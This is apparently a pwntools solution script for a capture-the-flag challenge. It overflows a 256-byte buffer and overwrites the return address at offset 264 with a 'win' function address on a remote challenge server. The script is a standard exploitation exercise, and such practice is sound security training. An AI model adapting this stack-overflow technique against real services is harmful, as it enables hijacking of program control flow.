from pwn import *
import time

#io = process('./chal')
io = remote('amt.rs', 30382)

io.readuntil(b'how much would you like to write?')

# chal buf is 0x100 (256 dec)
io.sendline(b'512')

# find number of bytes to main return address
#io.sendline(cyclic(512))
# 0x63616172_63616171

#win 40117a
#p = flat({0x63616171: p64(0x40117a)}, length=512)
p = flat({264: p64(0x40117a)}, length=512)
print(p)
print(hexdump(p))
io.sendline(p)

io.interactive()
